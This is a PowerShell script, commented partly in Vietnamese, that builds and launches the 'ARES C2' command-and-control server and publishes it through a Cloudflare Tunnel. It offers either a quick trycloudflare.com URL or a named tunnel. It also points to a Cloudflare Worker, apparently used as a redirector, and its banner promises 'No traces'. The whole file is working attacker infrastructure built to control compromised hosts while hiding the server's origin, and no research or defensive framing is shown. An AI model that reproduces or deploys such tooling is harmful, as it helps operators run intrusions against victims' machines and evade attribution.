<#
.SYNOPSIS
    ARES C2 — Start C2 Server + Cloudflare Tunnel

.DESCRIPTION
    Script khởi động đồng thời:
      1. Build + Start C2 server (Go)
      2. Start Cloudflare Tunnel (thay ngrok)
    
    Thay thế hoàn toàn workflow cũ: start_c2.ps1 + ngrok http

.PARAMETER Token
    Panel auth token (mặc định: auto-generated)

.PARAMETER Port
    C2 server port (mặc định: 8443)

.PARAMETER TunnelName
    Cloudflare tunnel name (mặc định: ares-c2)

.PARAMETER QuickTunnel
    Dùng Quick Tunnel (trycloudflare.com) — không cần login, URL tạm thời

.PARAMETER NoTLS
    Disable TLS trên C2 server (dùng HTTP — tunnel sẽ handle TLS)

.EXAMPLE
    .\start_c2_cloudflare.ps1
    .\start_c2_cloudflare.ps1 -Token "mytoken" -Port 443
    .\start_c2_cloudflare.ps1 -QuickTunnel     # Nhanh, không cần setup
#>
param(
    [string]$Token = "",
    [int]$Port = 8443,
    [string]$TunnelName = "ares-c2",
    [switch]$QuickTunnel,
    [switch]$NoTLS
)

$ErrorActionPreference = "Stop"
$projectDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$c2Dir = Join-Path $projectDir "c2server"
$buildDir = Join-Path $projectDir "build"

# ── Banner ──
Write-Host ""
Write-Host "  ╔═══════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "  ║  ☠  ARES C2 — Deploy via Cloudflare  ☠       ║" -ForegroundColor Red
Write-Host "  ║     No ngrok. No limits. No traces.           ║" -ForegroundColor DarkRed
Write-Host "  ╚═══════════════════════════════════════════════╝" -ForegroundColor Red
Write-Host ""

# ── Auto-generate token if empty ──
if (-not $Token) {
    $Token = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 24 | ForEach-Object { [char]$_ })
}

# ── Step 1: Build C2 ──
Write-Host "[1/3] Building C2 server..." -ForegroundColor Cyan

if (-not (Test-Path $buildDir)) { New-Item -ItemType Directory -Path $buildDir -Force | Out-Null }

$c2Exe = Join-Path $buildDir "ares_c2.exe"
Push-Location $c2Dir
try {
    & go build -ldflags="-s -w" -o $c2Exe ./cmd/
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  [!] C2 build failed!" -ForegroundColor Red
        exit 1
    }
    Write-Host "  [+] C2 built: $c2Exe" -ForegroundColor Green
} finally {
    Pop-Location
}

# ── Step 2: Start C2 Server (background) ──
Write-Host ""
Write-Host "[2/3] Starting C2 server on port $Port..." -ForegroundColor Cyan

$c2Args = @("--port", $Port, "--token", $Token, "--data", (Join-Path $projectDir "data"))
if ($NoTLS) {
    $c2Args += "--no-tls"
}

$c2Process = Start-Process -FilePath $c2Exe -ArgumentList $c2Args -PassThru -NoNewWindow
Write-Host "  [+] C2 server PID: $($c2Process.Id)" -ForegroundColor Green

# Wait for C2 to start
Start-Sleep -Seconds 2

# Verify C2 is running
if ($c2Process.HasExited) {
    Write-Host "  [!] C2 server crashed on startup!" -ForegroundColor Red
    exit 1
}

# ── Step 3: Start Cloudflare Tunnel ──
Write-Host ""
Write-Host "[3/3] Starting Cloudflare Tunnel..." -ForegroundColor Cyan

$c2Proto = if ($NoTLS) { "http" } else { "https" }
$c2LocalUrl = "${c2Proto}://localhost:$Port"

if ($QuickTunnel) {
    # Quick Tunnel — no login required, temporary URL
    Write-Host "  [*] Mode: Quick Tunnel (trycloudflare.com)" -ForegroundColor Yellow
    Write-Host "  [*] URL sẽ hiện bên dưới khi tunnel sẵn sàng..." -ForegroundColor Gray
    Write-Host ""

    $tunnelArgs = @("tunnel", "--url", $c2LocalUrl)
    if (-not $NoTLS) {
        $tunnelArgs += "--no-tls-verify"  # C2 dùng self-signed
    }

    # Print info
    Write-Host "  ╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "  ║  ARES C2 — DEPLOYED                                     ║" -ForegroundColor Green
    Write-Host "  ╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host ""
    Write-Host "  C2 Local:     $c2LocalUrl" -ForegroundColor White
    Write-Host "  Auth Token:   $Token" -ForegroundColor Yellow
    Write-Host "  C2 PID:       $($c2Process.Id)" -ForegroundColor White
    Write-Host "  Mode:         Quick Tunnel (URL hiện bên dưới)" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  [*] Tunnel URL sẽ xuất hiện trong log bên dưới..." -ForegroundColor Gray
    Write-Host "  [*] Cập nhật URL vào CF Worker: npx wrangler secret put C2_BACKEND" -ForegroundColor Gray
    Write-Host ""
    Write-Host "  Ctrl+C to stop" -ForegroundColor DarkGray
    Write-Host ""

    # Run tunnel (foreground — shows URL)
    try {
        & cloudflared @tunnelArgs
    } finally {
        # Cleanup: kill C2 when tunnel stops
        Write-Host ""
        Write-Host "  [!] Stopping C2 server..." -ForegroundColor Yellow
        Stop-Process -Id $c2Process.Id -Force -ErrorAction SilentlyContinue
        Write-Host "  [+] C2 stopped." -ForegroundColor Green
    }

} else {
    # Named Tunnel — requires setup (run setup_cloudflare_tunnel.ps1 first)
    Write-Host "  [*] Mode: Named Tunnel '$TunnelName'" -ForegroundColor Yellow

    # Check if tunnel exists
    $configFile = "$env:USERPROFILE\.cloudflared\config.yml"
    if (-not (Test-Path $configFile)) {
        Write-Host "  [!] Config file không tồn tại: $configFile" -ForegroundColor Red
        Write-Host "  [!] Chạy setup_cloudflare_tunnel.ps1 trước!" -ForegroundColor Red
        Write-Host "  [!] Hoặc dùng: -QuickTunnel để dùng tunnel tạm" -ForegroundColor Yellow
        Stop-Process -Id $c2Process.Id -Force -ErrorAction SilentlyContinue
        exit 1
    }

    # Get tunnel info
    $infoFile = Join-Path $projectDir ".cloudflare_tunnel_info"
    $tunnelUrl = "<tunnel-url>"
    if (Test-Path $infoFile) {
        $info = Get-Content $infoFile | ConvertFrom-StringData
        $tunnelUrl = "https://$($info.TUNNEL_NAME).cfargotunnel.com"
    }

    Write-Host ""
    Write-Host "  ╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "  ║  ARES C2 — DEPLOYED via Cloudflare Tunnel               ║" -ForegroundColor Green
    Write-Host "  ╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host ""
    Write-Host "  C2 Local:     $c2LocalUrl" -ForegroundColor White
    Write-Host "  Panel URL:    http://127.0.0.1:$Port/" -ForegroundColor Cyan
    Write-Host "  Auth Token:   $Token" -ForegroundColor Yellow
    Write-Host "  C2 PID:       $($c2Process.Id)" -ForegroundColor White
    Write-Host "  Tunnel:       $TunnelName" -ForegroundColor White
    Write-Host ""
    Write-Host "  Ctrl+C to stop" -ForegroundColor DarkGray
    Write-Host ""

    # Run named tunnel (foreground)
    try {
        & cloudflared tunnel run $TunnelName
    } finally {
        Write-Host ""
        Write-Host "  [!] Stopping C2 server..." -ForegroundColor Yellow
        Stop-Process -Id $c2Process.Id -Force -ErrorAction SilentlyContinue
        Write-Host "  [+] C2 stopped." -ForegroundColor Green
    }
}
